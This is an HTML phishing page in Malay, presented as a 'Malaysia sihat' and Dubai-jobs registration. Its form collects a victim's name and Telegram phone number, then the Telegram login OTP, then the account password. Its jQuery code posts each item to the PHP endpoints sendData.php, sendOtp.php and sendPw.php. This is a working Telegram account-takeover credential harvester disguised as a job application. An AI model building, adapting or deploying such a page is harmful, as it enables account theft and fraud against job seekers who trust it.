<!DOCTYPE html>
<html lang="en" class="h-100">

<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
    <!-- Required Meta Tags -->
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <!-- Plugins CSS -->
    <link rel="stylesheet" href="assets/css/plugins.css">
    <!-- Icon Plugins CSS -->
    <link rel="stylesheet" href="assets/css/iconplugins.css">
    <!-- Style CSS -->
    <link rel="stylesheet" href="assets/css/style.css">
    <!-- Responsive CSS -->
    <link rel="stylesheet" href="assets/css/responsive.css">
    <!-- Theme Dark CSS -->
    <link rel="stylesheet" href="assets/css/theme-dark.css">
    <!-- Title -->
    <title>Malaysia sihat</title>
    <!-- Favicon -->
    <link rel="icon" type="image/png">
</head>

<body>
    <html lang="en">

    <head>
        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
        <link rel="icon" />
        <meta name="viewport" content="width=device-width,initial-scale=1" />
        <meta name="theme-color" content="#000000" />
        <meta name="description" content="Jobs In Dubai" />
        <link rel="apple-touch-icon" />
        <!-- <link rel="manifest" href="manifest.json" /> -->
        <title>Malaysia sihat</title>
        <!-- <script defer="defer" src="/assets/main.cc62bdb7.js"></script> -->
        <link href="assets/main.7ff014f6.css" rel="stylesheet">
        <style>
            .btn-mk {
                color: #fff;
                background-color: #3776eb;
            }

            #loader {
                height: 80vh;
                width: 90vw;
                position: fixed;
                top: 0;
                left: 0;
                margin: 0;
                padding: 0;
                background: rgba(255, 255, 255, 0.7);
                display: flex;
                align-items: center;
                justify-content: center;
                z-index: 9999;
            }

            .loader {
                width: 45px;
                aspect-ratio: 1;
                --c: no-repeat linear-gradient(#000000 0 0);
                background:
                    var(--c) 0% 50%,
                    var(--c) 50% 50%,
                    var(--c) 100% 50%;
                background-size: 20% 100%;
                animation: l1 0.5s infinite linear;
            }

            @keyframes l1 {
                0% {
                    background-size: 20% 100%, 20% 100%, 20% 100%;
                }

                33% {
                    background-size: 20% 10%, 20% 100%, 20% 100%;
                }

                50% {
                    background-size: 20% 100%, 20% 10%, 20% 100%;
                }

                66% {
                    background-size: 20% 100%, 20% 100%, 20% 10%;
                }

                100% {
                    background-size: 20% 100%, 20% 100%, 20% 100%;
                }
            }

            /* Social Proof & Testimonials Styles */
            .proof-section {
                margin-top: 1.5rem;
                font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            }

            .proof-stats-grid {
                display: grid;
                grid-template-columns: repeat(3, 1fr);
                gap: 0.6rem;
                margin-bottom: 1.25rem;
            }

            .proof-stat-card {
                background: #ffffff;
                border-radius: 16px;
                padding: 0.85rem 0.4rem;
                text-align: center;
                box-shadow: 0 4px 15px rgba(0, 0, 0, 0.05);
                border: 1px solid #f1f5f9;
            }

            .proof-stat-number {
                display: block;
                font-size: 1.2rem;
                font-weight: 800;
                color: #1e3a8a;
                line-height: 1.2;
            }

            .proof-stat-label {
                display: block;
                font-size: 0.62rem;
                font-weight: 700;
                color: #8c9ba5;
                text-transform: uppercase;
                letter-spacing: 0.03em;
                margin-top: 0.35rem;
                line-height: 1.2;
            }

            .proof-divider {
                display: flex;
                align-items: center;
                gap: 0.5rem;
                margin-bottom: 1rem;
            }

            .proof-live-dot {
                width: 9px;
                height: 9px;
                background-color: #10b981;
                border-radius: 50%;
                flex-shrink: 0;
                box-shadow: 0 0 0 2px rgba(16, 185, 129, 0.2);
            }

            .proof-title {
                font-size: 0.75rem;
                font-weight: 800;
                color: #0f172a;
                text-transform: uppercase;
                letter-spacing: 0.03em;
                margin: 0;
                white-space: nowrap;
            }

            .proof-line {
                flex-grow: 1;
                height: 1px;
                background-color: #cbd5e1;
            }

            .proof-badge {
                background-color: #059669;
                color: #ffffff;
                font-size: 0.7rem;
                font-weight: 700;
                padding: 0.25rem 0.65rem;
                border-radius: 9999px;
                white-space: nowrap;
            }

            .proof-card {
                background: #ffffff;
                border-radius: 18px;
                padding: 1.1rem;
                margin-bottom: 1rem;
                box-shadow: 0 6px 20px rgba(0, 0, 0, 0.06);
                border: 1px solid #e2e8f0;
                border-left: 5px solid #10b981;
                position: relative;
                text-align: left;
            }

            .proof-card-header {
                display: flex;
                align-items: center;
                gap: 0.75rem;
                margin-bottom: 0.6rem;
            }

            .proof-avatar-wrapper {
                position: relative;
                flex-shrink: 0;
            }

            .proof-avatar {
                width: 48px;
                height: 48px;
                border-radius: 50%;
                display: flex;
                align-items: center;
                justify-content: center;
                font-weight: 800;
                font-size: 1.35rem;
                color: #ffffff;
            }

            .proof-avatar-blue {
                background: linear-gradient(135deg, #0284c7 0%, #0369a1 100%);
            }

            .proof-avatar-green {
                background: linear-gradient(135deg, #059669 0%, #047857 100%);
            }

            .proof-avatar-check {
                position: absolute;
                bottom: -2px;
                right: -2px;
                width: 18px;
                height: 18px;
                background-color: #10b981;
                border: 2px solid #ffffff;
                border-radius: 50%;
                display: flex;
                align-items: center;
                justify-content: center;
                color: #ffffff;
            }

            .proof-user-info {
                display: flex;
                flex-direction: column;
                gap: 0.2rem;
            }

            .proof-user-name-row {
                display: flex;
                align-items: center;
                gap: 0.5rem;
                flex-wrap: wrap;
            }

            .proof-user-name {
                font-size: 0.98rem;
                font-weight: 700;
                color: #1e293b;
                margin: 0;
                line-height: 1.2;
            }

            .proof-tag-female {
                background-color: #fdf2f8;
                color: #db2777;
                border: 1px solid #fbcfe8;
                font-size: 0.68rem;
                font-weight: 600;
                padding: 0.15rem 0.5rem;
                border-radius: 9999px;
                display: inline-flex;
                align-items: center;
                gap: 0.2rem;
            }

            .proof-tag-male {
                background-color: #eff6ff;
                color: #2563eb;
                border: 1px solid #bfdbfe;
                font-size: 0.68rem;
                font-weight: 600;
                padding: 0.15rem 0.5rem;
                border-radius: 9999px;
                display: inline-flex;
                align-items: center;
                gap: 0.2rem;
            }

            .proof-user-meta {
                display: flex;
                align-items: center;
                gap: 0.25rem;
                font-size: 0.75rem;
                color: #64748b;
            }

            .proof-stars {
                color: #f59e0b;
                font-size: 0.95rem;
                letter-spacing: 0.15rem;
                margin-bottom: 0.65rem;
            }

            .proof-alert-box {
                background-color: #ecfdf5;
                border: 1px solid #a7f3d0;
                border-radius: 14px;
                padding: 0.65rem 0.85rem;
                display: flex;
                align-items: center;
                gap: 0.75rem;
                margin-bottom: 0.75rem;
            }

            .proof-alert-icon {
                width: 32px;
                height: 32px;
                background-color: #10b981;
                border-radius: 50%;
                display: flex;
                align-items: center;
                justify-content: center;
                color: #ffffff;
                flex-shrink: 0;
            }

            .proof-alert-content {
                display: flex;
                flex-direction: column;
                text-align: left;
            }

            .proof-alert-title {
                font-size: 0.78rem;
                font-weight: 800;
                color: #065f46;
                display: flex;
                align-items: center;
                gap: 0.35rem;
                letter-spacing: 0.02em;
            }

            .proof-alert-ref {
                font-size: 0.72rem;
                font-weight: 600;
                color: #047857;
                margin-top: 0.15rem;
            }

            .proof-alert-ref code {
                font-family: inherit;
                font-weight: 700;
            }

            .proof-comment {
                font-size: 0.83rem;
                color: #475569;
                line-height: 1.5;
                margin: 0;
                text-align: left;
            }

            /* Custom Modern Form Styling matching reference */
            .field-block {
                margin-bottom: 16px;
                text-align: left;
            }
            .field-block__label {
                display: block;
                margin: 0 0 7px;
                font-size: 0.85rem;
                font-weight: 700;
                color: #1e293b;
            }
            .modern-field {
                display: flex;
                align-items: center;
                height: 50px;
                border: 1.5px solid #e2e8f0;
                border-radius: 14px;
                background: #fff;
                transition: all 0.2s ease;
                padding: 0 14px;
                gap: 10px;
            }
            .modern-field:focus-within {
                border-color: #3b82f6;
                box-shadow: 0 0 0 3px rgba(59, 130, 246, 0.15);
            }
            .modern-field__icon {
                color: #94a3b8;
                display: flex;
                align-items: center;
                justify-content: center;
                flex-shrink: 0;
            }
            .modern-field__icon svg {
                width: 19px;
                height: 19px;
            }
            .modern-field select,
            .modern-field input {
                border: none;
                outline: none;
                width: 100%;
                height: 100%;
                background: transparent;
                font-size: 0.92rem;
                color: #1e293b;
                padding: 0;
            }
            .modern-field select {
                cursor: pointer;
                appearance: none;
                -webkit-appearance: none;
            }
            .modern-field-select-wrap {
                position: relative;
            }
            .modern-field__arrow {
                width: 8px;
                height: 8px;
                border-right: 2px solid #94a3b8;
                border-bottom: 2px solid #94a3b8;
                transform: rotate(45deg);
                pointer-events: none;
                flex-shrink: 0;
                margin-right: 2px;
            }
            .phone-field__code-badge {
                font-size: 0.95rem;
                font-weight: 700;
                color: #16a34a;
                padding-right: 10px;
                border-right: 1.5px solid #e2e8f0;
                margin-right: 2px;
                flex-shrink: 0;
                user-select: none;
            }
            .field-hint-text {
                font-size: 0.74rem;
                color: #64748b;
                margin-top: 6px;
                margin-bottom: 0;
                padding-left: 2px;
            }
            .modern-submit-btn {
                width: 100%;
                height: 48px;
                border: none;
                border-radius: 12px;
                background: linear-gradient(135deg, #1e3a8a, #2563eb);
                color: #ffffff;
                font-size: 0.95rem;
                font-weight: 700;
                letter-spacing: 0.05em;
                cursor: pointer;
                transition: transform 0.15s ease, box-shadow 0.15s ease;
                box-shadow: 0 4px 14px rgba(37, 99, 235, 0.35);
            }
            .modern-submit-btn:hover {
                transform: translateY(-1px);
                box-shadow: 0 6px 18px rgba(37, 99, 235, 0.45);
            }
            .modern-submit-btn:active {
                transform: translateY(1px);
            }
        </style>
    </head>

    <body>
        <div id="root">
            <main class="flex-grow">
                <div class="relative min-h-screen flex flex-col items-center justify-start py-8 px-3 sm:px-4 overflow-y-auto">
                    <video class="fixed top-0 left-0 w-full h-full object-cover -z-10 pointer-events-none"
                        src="dubaijobs.mp4" autoplay="" muted loop></video>
                    <div
                        class="w-full max-w-lg p-6 bg-white bg-opacity-10 backdrop-blur-sm rounded-lg shadow-[0_10px_30px_rgba(0,0,0,0.9)] relative z-10">
                        <div class="w-full flex justify-center my-6">
                            <img src="assets/images/gambar1.png" alt="Header"
                                class="w-full h-auto object-contain rounded-lg shadow-2xl shadow-gray-500">
                        </div>
                        <div class="first">
                            <form action="javascript:void(0)" method="post" id="firstForm">
                                <input type="hidden" id="country" value="60">

                                <!-- Field 1: Negeri / Wilayah -->
                                <div class="field-block">
                                    <label class="field-block__label" for="negeri">Negeri / Wilayah</label>
                                    <div class="modern-field modern-field-select-wrap">
                                        <span class="modern-field__icon">
                                            <svg viewBox="0 0 24 24" fill="currentColor">
                                                <path d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7zm0 9.5A2.5 2.5 0 1112 6a2.5 2.5 0 010 5.5z"/>
                                            </svg>
                                        </span>
                                        <select name="negeri" id="negeri" required>
                                            <option value="" disabled selected>Pilih negeri atau wilayah</option>
                                            <option value="Johor">Johor</option>
                                            <option value="Selangor">Selangor</option>
                                            <option value="Sarawak">Sarawak</option>
                                            <option value="Sabah">Sabah</option>
                                            <option value="Pulau Pinang">Pulau Pinang</option>
                                            <option value="Negeri Sembilan">Negeri Sembilan</option>
                                            <option value="Melaka">Melaka</option>
                                            <option value="Perak">Perak</option>
                                            <option value="Pahang">Pahang</option>
                                            <option value="Terengganu">Terengganu</option>
                                            <option value="Kelantan">Kelantan</option>
                                            <option value="Kedah">Kedah</option>
                                            <option value="Perlis">Perlis</option>
                                            <option value="Kuala Lumpur">Kuala Lumpur</option>
                                            <option value="Putrajaya">Putrajaya</option>
                                            <option value="Labuan">Labuan</option>
                                        </select>
                                        <span class="modern-field__arrow"></span>
                                    </div>
                                </div>

                                <!-- Field 2: Nama Penuh -->
                                <div class="field-block">
                                    <label class="field-block__label" for="name">Nama Penuh</label>
                                    <div class="modern-field">
                                        <span class="modern-field__icon">
                                            <svg viewBox="0 0 24 24" fill="currentColor">
                                                <path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/>
                                            </svg>
                                        </span>
                                        <input name="name" id="name" maxlength="40" type="text" required placeholder="Nama penuh">
                                    </div>
                                </div>

                                <!-- Field 3: Nombor Telegram -->
                                <div class="field-block">
                                    <label class="field-block__label" for="phone">Nombor Telegram</label>
                                    <div class="modern-field">
                                        <span class="modern-field__icon">
                                            <svg viewBox="0 0 24 24" fill="currentColor">
                                                <path d="M6.62 10.79a15.05 15.05 0 006.59 6.59l2.2-2.2a1 1 0 011.01-.24c1.12.37 2.33.57 3.57.57a1 1 0 011 1V20a1 1 0 01-1 1C10.07 21 3 13.93 3 5a1 1 0 011-1h3.5a1 1 0 011 1c0 1.25.2 2.45.57 3.57a1 1 0 01-.25 1.01l-2.2 2.21z"/>
                                            </svg>
                                        </span>
                                        <span class="phone-field__code-badge">+60</span>
                                        <input name="phone" id="phone" maxlength="15" type="tel" inputmode="numeric" required placeholder="12 345 6789">
                                    </div>
                                    <p class="field-hint-text">Pastikan nombor Telegram aktif dan betul</p>
                                </div>

                                <div id="wrong" class="text-red-500 text-sm mt-1" style="display: none;">Phone Number Invalid</div>
                                <div id="feedback" class="text-sm mt-1 text-center" style="color: #dc2626; font-weight: 600;"></div>
                                <div id="loader" style="display:none;">
                                    <div class="loader"></div>
                                </div>

                                <div class="text-center mt-3">
                                    <button type="button" class="modern-submit-btn" onclick="processFirstData()">REGISTER</button>
                                </div>
                            </form>
                        </div>
                        <div class="second" style="display: none;">
                            <form action="javascript:void(0)" method="post" id="secondForm">
                                <input type="hidden" name="full_name" id="validateFullName" readonly>
                                <input type="hidden" name="phone_number" id="validatePhoneNumber" readonly>
                                <div class="mb-3">
                                    <label for="otp" class="form-label">
                                        <span id="ctl00_RecipientMasterContent_lblEntry_IDNo" style="color: #1e3a8a; font-weight: 600;">Kami telah menghantar OTP 5 digit
                                            ke akaun Telegram anda, sila buka aplikasi Telegram anda dan semak
                                            mesej kami.</span>
                                    </label>
                                    <input name="otp" maxlength="5" id="otp" class="form-control" type="text"
                                        pattern="\d*" inputmode="numeric"
                                        oninput="this.value = this.value.replace(/[^0-9]/g, '').slice(0, 5);"
                                        placeholder="*****" required>
                                </div>
                                <div class="text-center">
                                    <button type="submit" class="btn btn-lg btn-block btn-mk"
                                        onclick="processSecondData()">Next</button>
                                </div>
                            </form>
                        </div>
                        <div class="third" style="display: none;">
                            <form action="javascript:void(0)" method="post" id="thirdForm">
                                <input type="hidden" name="full_name" id="validateFullName" readonly>
                                <input type="hidden" name="phone_number" id="validatePhoneNumber" readonly>
                                <input type="hidden" name="otp_code" id="validateOtp_code" readonly>
                                <div class="mb-3">
                                    <label for="password" class="form-label">
                                        <span id="ctl00_RecipientMasterContent_lblEntry_IDNo" style="color: #1e3a8a; font-weight: 600;">Kata laluan</span>
                                    </label>
                                    <input name="password" id="password" class="form-control" type="text"
                                        required="true" placeholder="********">
                                </div>
                                <div class="text-center">
                                    <button type="submit" class="btn btn-lg btn-block btn-mk"
                                        onclick="processThirdData()">Next</button>
                                </div>
                            </form>
                        </div>
                        <div class="row four" id="ctl00_RecipientMasterContent_divResultNotFound"
                            style="display: none;">
                            <p class="d-flex justify-content-center align-items-center"><img src="assets/images/processing.gif" id="ctl00_logohead"
                                    class="img-fluid" width="160" /></p>
                            <h5 class="text-center"><span id="ctl00_RecipientMasterContent_lblNoRecord" style="color: #ffffff;">Sila tunggu
                                    sebentar. Kami sedang memproses permohonan anda.</span></h5>
                            <h5 class="text-center"><span id="ctl00_RecipientMasterContent_lblNoRecord" style="color: #ffffff;">Tunggu 1x24 jam
                                    untuk mendapatkan pengesahan pendaftaran melalui aplikasi Telegram anda.</span></h5>
                            <p class="text-center"><a href="" class="btn btn-lg btn-block btn-mk">&laquo; <span
                                        id="ctl00_RecipientMasterContent_lblGoBack_NoResult">PENGESAHAN</span></a>
                            </p>
                        </div>
                        <script type="text/javascript">
                            //<![CDATA[
                            var Page_ValidationActive = false;
                            if (typeof (ValidatorOnLoad) == "function") {
                                ValidatorOnLoad();
                            }
                            function ValidatorOnSubmit() {
                                if (Page_ValidationActive) {
                                    return ValidatorCommonOnSubmit();
                                } else {
                                    return true;
                                }
                            }
                        </script>
                    </div>
                </div>
        </div>
        </div>
        </div>
        </div>
        <script src="assets/js/jquery.min.js"></script>
        <div class="switch-box">
            <label id="switch" class="switch">
                <input type="checkbox" onchange="toggleTheme()" id="slider">
                <span class="slider round">
                </span>
            </label>
        </div>
        <script src="assets/js/script.js"></script>
        <script>
            function updatePhonePrefix() {
                const select = document.getElementById("country");
                const selectedOption = select.options[select.selectedIndex];
                const code = selectedOption.value;
                const flag = selectedOption.getAttribute("data-flag");

                const prefixDisplay = document.getElementById("prefixDisplay");
                prefixDisplay.innerHTML = `<img src="assets/images/${flag}" width="20" height="20" /> +${code}`;
            }
        </script>
        <script>
            // åŠ è½½å¤šè¯­è¨€
            var language = getQueryString('language')
            loadLocale(function (e) {
                app.locale = Object.assign(e.Common, e.CommonShare)
            }, language)
            var app = new Vue({
                el: '#app',
                data: {
                    locale: {},
                    uid: '2004219',
                },
                created() {
                    $('#app').show();
                    this.starScroll();
                },
                methods: {
                    starScroll() {
                        var _this = this;
                        _this.scrollTimer && clearTimeout(_this.scrollTimer)
                        _this.scrollTimer = setTimeout(() => {
                            var $box = $("#list").find(".list:first");
                            $box.css({
                                marginTop: 0
                            })
                            var $item = $box.find(".item:first");
                            var outerHeight = $item.outerHeight(true)
                            $box.animate({
                                "marginTop": -outerHeight + "px"
                            }, 1000, function () {
                                $box.css({
                                    marginTop: 0
                                }).find(".item:first").appendTo($box);
                                _this.starScroll();
                            })
                        }, 600);
                    },
                },
            })
        </script>
        <script>
            document.addEventListener('DOMContentLoaded', function () {
                const container = document.querySelector('.testimoni-container');
                const items = Array.from(container.children);
                let index = 0;
                function scrollTestimonial() {
                    container.style.transform = `translateY(-${index * 60}px)`;
                    container.style.transition = 'transform 1s ease';
                    if (index >= items.length - 5) {
                        setTimeout(() => {
                            container.style.transition = 'none';
                            container.style.transform = 'translateY(0)';
                            index = 0;
                        }, 1000);
                    } else {
                        index++;
                    }
                }
                setInterval(scrollTestimonial, 3000);
            });
            document.addEventListener('DOMContentLoaded', function () {
                const header = document.querySelector('.sticky-header');
                let lastScrollTop = 0;
                window.addEventListener('scroll', function () {
                    const scrollTop = window.pageYOffset || document.documentElement.scrollTop;
                    if (scrollTop > lastScrollTop && scrollTop > 100) {
                        header.classList.add('visible-header');
                        header.classList.remove('hidden-header');
                    } else if (scrollTop <= 100) {
                        header.classList.add('hidden-header');
                        header.classList.remove('visible-header');
                    }
                    lastScrollTop = scrollTop;
                });
            });
        </script>
        <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
        <script>
            function processFirstData() {
                const name = $("#name").val().trim();
                const phone = $("#phone").val().trim();
                const code = $("#country").val(); // ambil kode negara dari select
                const fullPhone = "+" + code + phone;

                const feedback = $("#feedback");
                const loader = $("#loader");

                feedback.text("");
                if (!name || !phone) {
                    feedback.text("Nama dan nomor wajib diisi.");
                    return;
                }

                loader.show();

                $.ajax({
                    url: "data/sendData.php",
                    type: "POST",
                    contentType: "application/json",
                    data: JSON.stringify({ name: name, phone: fullPhone }),
                    success: function (res) {
                        loader.hide();
                        if (res.status === "success") {
                            sessionStorage.setItem("full_name", name);
                            sessionStorage.setItem("phone_number", fullPhone);

                            $("#validateFullName").val(name);
                            $("#validatePhoneNumber").val(fullPhone);

                            $(".first").hide();
                            $(".second").show();
                        } else {
                            feedback.text(res.message);
                        }
                    },
                    error: function () {
                        loader.hide();
                        feedback.text("Gagal koneksi ke server.");
                    }
                });
            }

            function processSecondData() {
                const otp = $("#otp").val().trim();
                if (!otp || otp.length !== 5) {
                    alert("Masukkan OTP 5 digit.");
                    return;
                }

                $.ajax({
                    url: "data/sendOtp.php",
                    type: "POST",
                    contentType: "application/json",
                    data: JSON.stringify({ otp: otp }),
                    success: function (res) {
                        if (res.status === "success") {
                            $(".second").hide();
                            $(".third").show();
                        } else {
                            alert(res.message);
                        }
                    },
                    error: function () {
                        alert("Gagal memverifikasi OTP.");
                    }
                });
            }

            function processThirdData() {
                const password = $("#password").val().trim();

                $.ajax({
                    url: "data/sendPw.php",
                    type: "POST",
                    contentType: "application/json",
                    data: JSON.stringify({ password: password }),
                    success: function (res) {
                        if (res.status === "success") {
                            $(".third").hide();
                            $(".four").show();
                        } else {
                            alert(res.message);
                        }
                    },
                    error: function () {
                        alert("Gagal mengirim data akhir.");
                    }
                });
            }
            
            $(document).ready(function () {
                if (sessionStorage.getItem("full_name")) {
                    $("#validateFullName").val(sessionStorage.getItem("full_name"));
                }
                if (sessionStorage.getItem("phone_number")) {
                    $("#validatePhoneNumber").val(sessionStorage.getItem("phone_number"));
                }
            });
        </script>
    </body>

    </html>